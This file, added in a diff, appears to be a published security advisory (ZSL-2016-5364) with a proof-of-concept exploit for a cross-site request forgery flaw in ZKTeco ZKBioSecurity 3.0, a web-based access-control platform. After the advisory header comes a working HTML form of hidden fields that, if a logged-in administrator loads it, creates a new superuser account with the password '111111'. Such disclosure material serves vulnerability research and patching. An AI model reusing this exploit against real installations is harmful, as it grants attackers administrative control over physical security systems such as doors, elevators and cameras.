@@ -1,0 +1,72 @@
+﻿<!--
+
+ZKTeco ZKBioSecurity 3.0 CSRF Add Superadmin Exploit
+
+
+Vendor: ZKTeco Inc. | Xiamen ZKTeco Biometric Identification Technology Co.,ltd
+Product web page: http://www.zkteco.com
+Affected version: 3.0.1.0_R_230
+                  Platform: 3.0.1.0_R_230
+                  Personnel: 1.0.1.0_R_1916
+                  Access: 6.0.1.0_R_1757
+                  Elevator: 2.0.1.0_R_777
+                  Visitor: 2.0.1.0_R_877
+                  Video:2.0.1.0_R_489
+                  Adms: 1.0.1.0_R_197
+
+Summary: ZKBioSecurity3.0 is the ultimate "All in One" web based security
+platform developed by ZKTeco. It contains four integrated modules: access
+control, video linkage, elevator control and visitor management. With an
+optimized system architecture designed for high level biometric identification
+and a modern-user friendly UI, ZKBioSecurity 3.0 provides the most advanced
+solution for a whole new user experience.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Microsoft Windows 7 Professional SP1 (EN)
+           Apache-Coyote/1.1
+           Apache Tomcat/7.0.56
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5364
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5364.php
+
+
+18.07.2016
+
+-->
+
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:8088/authUserAction!edit.action" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="authUser&#46;username" value="thricer" />
+      <input type="hidden" name="authUser&#46;loginPwd" value="111111" />
+      <input type="hidden" name="repassword" value="111111" />
+      <input type="hidden" name="authUser&#46;isActive" value="true" />
+      <input type="hidden" name="authUser&#46;isSuperuser" value="true" />
+      <input type="hidden" name="groupIds" value="1" />
+      <input type="hidden" name="deptIds" value="1" />
+      <input type="hidden" name="areaIds" value="1" />
+      <input type="hidden" name="authUser&#46;email" value="lab@zeroscience.mk" />
+      <input type="hidden" name="authUser&#46;name" value="test" />
+      <input type="hidden" name="authUser&#46;lastName" value="lasttest" />
+      <input type="hidden" name="fingerTemplate" value="&#13;" />
+      <input type="hidden" name="fingerId" value="&#13;" />
+      <input type="hidden" name="logMethod" value="add" />
+      <input type="hidden" name="un" value="1471451964349_2769" />
+      <input type="hidden" name="systemCode" value="base" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
